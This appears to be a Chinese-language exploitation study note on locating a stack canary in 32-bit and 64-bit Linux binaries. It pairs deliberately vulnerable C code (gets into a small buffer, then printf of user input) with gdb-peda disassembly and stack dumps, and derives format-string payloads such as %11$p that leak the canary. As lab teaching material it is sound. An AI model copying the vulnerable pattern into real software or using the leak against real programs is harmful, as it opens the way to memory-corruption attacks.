---
title: 如何确定canary地址.md
layout: doc
---
# {{$frontmatter.title}}

## 源码
```c
#include <stdio.h>

void func(){
    char s[20];
    gets(&s);
    printf(s);
}

int main(){
    func();
    char s[20];
    gets(&s);
    printf(s);
}
```
编译 

```zsh
gcc -m32 -fstack-protector-all  canary.c -o x86
gcc -fstack-protector-all  canary.c -o x64
```

## 32

main

```zsh
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x000011ff <+0>:     lea    ecx,[esp+0x4]
   0x00001203 <+4>:     and    esp,0xfffffff0
   0x00001206 <+7>:     push   DWORD PTR [ecx-0x4]
   0x00001209 <+10>:    push   ebp
   0x0000120a <+11>:    mov    ebp,esp
   0x0000120c <+13>:    push   ebx
   0x0000120d <+14>:    push   ecx
   0x0000120e <+15>:    sub    esp,0x20
   0x00001211 <+18>:    call   0x10b0 <__x86.get_pc_thunk.bx>
   0x00001216 <+23>:    add    ebx,0x2dde
   0x0000121c <+29>:    mov    eax,gs:0x14
   0x00001222 <+35>:    mov    DWORD PTR [ebp-0xc],eax
   0x00001225 <+38>:    xor    eax,eax
   0x00001227 <+40>:    call   0x11ad <func>
   0x0000122c <+45>:    sub    esp,0xc
   0x0000122f <+48>:    lea    eax,[ebp-0x20]
   0x00001232 <+51>:    push   eax
   0x00001233 <+52>:    call   0x1050 <gets@plt>
   0x00001238 <+57>:    add    esp,0x10
   0x0000123b <+60>:    sub    esp,0xc
   0x0000123e <+63>:    lea    eax,[ebp-0x20]
   0x00001241 <+66>:    push   eax
   0x00001242 <+67>:    call   0x1040 <printf@plt>
   0x00001247 <+72>:    add    esp,0x10
   0x0000124a <+75>:    mov    eax,0x0
   0x0000124f <+80>:    mov    edx,DWORD PTR [ebp-0xc]
   0x00001252 <+83>:    sub    edx,DWORD PTR gs:0x14
   0x00001259 <+90>:    je     0x1260 <main+97>
   0x0000125b <+92>:    call   0x1270 <__stack_chk_fail_local>
   0x00001260 <+97>:    lea    esp,[ebp-0x8]
   0x00001263 <+100>:   pop    ecx
   0x00001264 <+101>:   pop    ebx
   0x00001265 <+102>:   pop    ebp
   0x00001266 <+103>:   lea    esp,[ecx-0x4]
   0x00001269 <+106>:   ret
End of assembler dump.
```

可以看到，每个函数都有自己的canary 其值也不一样

main 的是 ebp-0xC 的位置

func
```zsh
gdb-peda$ disassemble func
Dump of assembler code for function func:
   0x000011ad <+0>:     push   ebp
   0x000011ae <+1>:     mov    ebp,esp
   0x000011b0 <+3>:     push   ebx
   0x000011b1 <+4>:     sub    esp,0x24
   0x000011b4 <+7>:     call   0x10b0 <__x86.get_pc_thunk.bx>
   0x000011b9 <+12>:    add    ebx,0x2e3b
   0x000011bf <+18>:    mov    eax,gs:0x14
   0x000011c5 <+24>:    mov    DWORD PTR [ebp-0xc],eax
   0x000011c8 <+27>:    xor    eax,eax
   0x000011ca <+29>:    sub    esp,0xc
   0x000011cd <+32>:    lea    eax,[ebp-0x20]
   0x000011d0 <+35>:    push   eax
   0x000011d1 <+36>:    call   0x1050 <gets@plt>
   0x000011d6 <+41>:    add    esp,0x10
   0x000011d9 <+44>:    sub    esp,0xc
   0x000011dc <+47>:    lea    eax,[ebp-0x20]
   0x000011df <+50>:    push   eax
   0x000011e0 <+51>:    call   0x1040 <printf@plt>
   0x000011e5 <+56>:    add    esp,0x10
   0x000011e8 <+59>:    nop
   0x000011e9 <+60>:    mov    eax,DWORD PTR [ebp-0xc]
   0x000011ec <+63>:    sub    eax,DWORD PTR gs:0x14
   0x000011f3 <+70>:    je     0x11fa <func+77>
   0x000011f5 <+72>:    call   0x1270 <__stack_chk_fail_local>
   0x000011fa <+77>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x000011fd <+80>:    leave
   0x000011fe <+81>:    ret
End of assembler dump.
```
可以看到 canary的位置是 ebp-0xC

但是 func和main里的 值是不同的

我们下断点到func的printf

```zsh
gdb-peda$ b *func+51
Breakpoint 1 at 0x11e0

# 运行输入 7 个 a
# 查看canary的位置和值
gdb-peda$ x $ebp-0xC
0xffffd29c:     0x863f9400

# 查看栈空间
gdb-peda$ stack 0x20
0000| 0xffffd270 --> 0xffffd288 ("aaaaaaa")
0004| 0xffffd274 --> 0x1
0008| 0xffffd278 --> 0xf7fc2730 ("$SUV\264\221\226\006")
0012| 0xffffd27c --> 0x565561b9 (<func+12>:     add    ebx,0x2e3b)
0016| 0xffffd280 --> 0x0
0020| 0xffffd284 --> 0x1
0024| 0xffffd288 ("aaaaaaa")
0028| 0xffffd28c --> 0x616161 ('aaa')
0032| 0xffffd290 --> 0xffffffff
0036| 0xffffd294 --> 0xf7fca67c --> 0xe
0040| 0xffffd298 --> 0xf7ffd5e8 --> 0xf7fca000 --> 0x464c457f
0044| 0xffffd29c --> 0x863f9400
0048| 0xffffd2a0 --> 0xf7ffcff4 --> 0x32f34
0052| 0xffffd2a4 --> 0x56558ff4 --> 0x3ef0
0056| 0xffffd2a8 --> 0xffffd2d8 --> 0x0
0060| 0xffffd2ac (",bUV")
0064| 0xffffd2b0 --> 0x0
0068| 0xffffd2b4 --> 0x0
0072| 0xffffd2b8 --> 0x13
0076| 0xffffd2bc --> 0xf7fc2410 --> 0xf7c00000 --> 0x464c457f
0080| 0xffffd2c0 --> 0xf7c216ac --> 0x21e04c
0084| 0xffffd2c4 --> 0xf7fd9e61 (<_dl_fixup+225>:       mov    DWORD PTR [esp+0x28],eax)
0088| 0xffffd2c8 --> 0xf7c1c9a2 ("_dl_audit_preinit")
0092| 0xffffd2cc --> 0x863f9400
0096| 0xffffd2d0 --> 0xffffd2f0 --> 0x1
--More--(25/32)
0100| 0xffffd2d4 --> 0xf7e1dff4 --> 0x21dd8c
0104| 0xffffd2d8 --> 0x0
0108| 0xffffd2dc --> 0xf7c237c5 (<__libc_start_call_main+117>:  add    esp,0x10)
0112| 0xffffd2e0 --> 0x1
0116| 0xffffd2e4 --> 0x0
0120| 0xffffd2e8 --> 0x78 ('x')
0124| 0xffffd2ec --> 0xf7c237c5 (<__libc_start_call_main+117>:  add    esp,0x10)

```
计算偏移

0xffffd29c - 0xffffd270 = 44

44 / 4 = 11

payload: %11$p

验证 
```zsh
gdb-peda$ r
Starting program: /home/kali/win/Downloads/x86
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
%11$p
gdb-peda$ x $ebp-0xC
0xffffd29c:     0xffd01200
gdb-peda$ c
Continuing.
0xffd01200
```

## 64

### main
```zsh
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x00000000000011a9 <+0>:     push   rbp
   0x00000000000011aa <+1>:     mov    rbp,rsp
   0x00000000000011ad <+4>:     sub    rsp,0x20
   0x00000000000011b1 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x00000000000011ba <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000011be <+21>:    xor    eax,eax
   0x00000000000011c0 <+23>:    mov    eax,0x0
   0x00000000000011c5 <+28>:    call   0x1159 <func>
   0x00000000000011ca <+33>:    lea    rax,[rbp-0x20]
   0x00000000000011ce <+37>:    mov    rdi,rax
   0x00000000000011d1 <+40>:    mov    eax,0x0
   0x00000000000011d6 <+45>:    call   0x1050 <gets@plt>
   0x00000000000011db <+50>:    lea    rax,[rbp-0x20]
   0x00000000000011df <+54>:    mov    rdi,rax
   0x00000000000011e2 <+57>:    mov    eax,0x0
   0x00000000000011e7 <+62>:    call   0x1040 <printf@plt>
   0x00000000000011ec <+67>:    mov    eax,0x0
   0x00000000000011f1 <+72>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000000011f5 <+76>:    sub    rdx,QWORD PTR fs:0x28
   0x00000000000011fe <+85>:    je     0x1205 <main+92>
   0x0000000000001200 <+87>:    call   0x1030 <__stack_chk_fail@plt>
   0x0000000000001205 <+92>:    leave
   0x0000000000001206 <+93>:    ret
End of assembler dump.
```

### func
```zsh
gdb-peda$ disassemble func
Dump of assembler code for function func:
   0x0000000000001159 <+0>:     push   rbp
   0x000000000000115a <+1>:     mov    rbp,rsp
   0x000000000000115d <+4>:     sub    rsp,0x20
   0x0000000000001161 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x000000000000116a <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000000116e <+21>:    xor    eax,eax
   0x0000000000001170 <+23>:    lea    rax,[rbp-0x20]
   0x0000000000001174 <+27>:    mov    rdi,rax
   0x0000000000001177 <+30>:    mov    eax,0x0
   0x000000000000117c <+35>:    call   0x1050 <gets@plt>
   0x0000000000001181 <+40>:    lea    rax,[rbp-0x20]
   0x0000000000001185 <+44>:    mov    rdi,rax
   0x0000000000001188 <+47>:    mov    eax,0x0
   0x000000000000118d <+52>:    call   0x1040 <printf@plt>
   0x0000000000001192 <+57>:    nop
   0x0000000000001193 <+58>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000001197 <+62>:    sub    rax,QWORD PTR fs:0x28
   0x00000000000011a0 <+71>:    je     0x11a7 <func+78>
   0x00000000000011a2 <+73>:    call   0x1030 <__stack_chk_fail@plt>
   0x00000000000011a7 <+78>:    leave
   0x00000000000011a8 <+79>:    ret
End of assembler dump.
```

### 确定偏移 
和 32位一样
```zsh
gdb-peda$ b *func+52
Breakpoint 1 at 0x118d

gdb-peda$ stack 20
0000| 0x7fffffffe0f0 --> 0x61616161616161 ('aaaaaaa')
0008| 0x7fffffffe0f8 --> 0x0
0016| 0x7fffffffe100 --> 0x0
0024| 0x7fffffffe108 --> 0xcb8aad833bfea600
0032| 0x7fffffffe110 --> 0x7fffffffe140 --> 0x1
0040| 0x7fffffffe118 --> 0x5555555551ca (<main+33>:     lea    rax,[rbp-0x20])
0048| 0x7fffffffe120 --> 0x0
0056| 0x7fffffffe128 --> 0x7ffff7fe6900 (<dl_main>:     push   rbp)
0064| 0x7fffffffe130 --> 0x0
0072| 0x7fffffffe138 --> 0xcb8aad833bfea600
0080| 0x7fffffffe140 --> 0x1
0088| 0x7fffffffe148 --> 0x7ffff7df06ca (<__libc_start_call_main+122>:  mov    edi,eax)
0096| 0x7fffffffe150 --> 0x7fffffffe240 --> 0x7fffffffe248 --> 0x38 ('8')
0104| 0x7fffffffe158 --> 0x5555555551a9 (<main>:        push   rbp)
0112| 0x7fffffffe160 --> 0x155554040
0120| 0x7fffffffe168 --> 0x7fffffffe258 --> 0x7fffffffe513 ("/home/kali/win/Downloads/x64")
0128| 0x7fffffffe170 --> 0x7fffffffe258 --> 0x7fffffffe513 ("/home/kali/win/Downloads/x64")
0136| 0x7fffffffe178 --> 0x9a22196acfa30b05
0144| 0x7fffffffe180 --> 0x0
0152| 0x7fffffffe188 --> 0x7fffffffe268 --> 0x7fffffffe530 ("USER=kali")
```

24 - 0 / 8 = 3

3 + 6 = 9

6 个寄存器参数

